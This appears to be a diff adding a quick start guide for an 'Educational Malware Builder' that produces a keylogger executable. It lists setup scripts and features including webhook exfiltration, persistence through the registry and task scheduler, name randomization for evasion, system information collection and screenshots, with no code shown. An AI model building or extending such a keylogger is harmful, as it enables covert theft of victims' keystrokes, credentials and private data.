@@ -1,0 +1,61 @@
+========================================
+   Educational Malware Builder
+   Quick Start Guide
+========================================
+
+This project includes three batch scripts to make setup and usage easier:
+
+1. install_requirements.bat
+   - Installs all required Python packages
+   - Run this FIRST if you haven't set up the project yet
+   - Only needs to be run once
+
+2. test_setup.bat
+   - Tests if all dependencies are properly installed
+   - Run this to verify everything is working
+   - Shows ✓ for working dependencies, ✗ for missing ones
+
+3. start_builder.bat
+   - Starts the Educational Malware Builder
+   - This is the main application
+   - Run this to build your keylogger
+
+========================================
+   Usage Instructions
+========================================
+
+First Time Setup:
+1. Double-click "install_requirements.bat"
+2. Wait for installation to complete
+3. Double-click "test_setup.bat" to verify
+4. Double-click "start_builder.bat" to begin
+
+Regular Usage:
+- Just double-click "start_builder.bat"
+
+========================================
+   Features Available
+========================================
+
+The builder includes these features:
+✓ Core Keylogger
+✓ Log to File
+✓ Webhook Exfiltration (with enhanced formatting)
+✓ Persistence (Registry, Task Scheduler, Startup)
+✓ Polymorphism (Randomize names)
+✓ Uninstall Script
+✓ Debug Mode
+✓ System Information Collection (NEW)
+✓ Startup Screenshot (NEW)
+
+========================================
+   Important Notes
+========================================
+
+⚠️  WARNING: This tool is for educational purposes only!
+    Use only in isolated lab environments.
+
+The generated executable will be in: build_output/keylogger.exe
+Uninstall script: build_output/uninstall.bat
+
+======================================== 
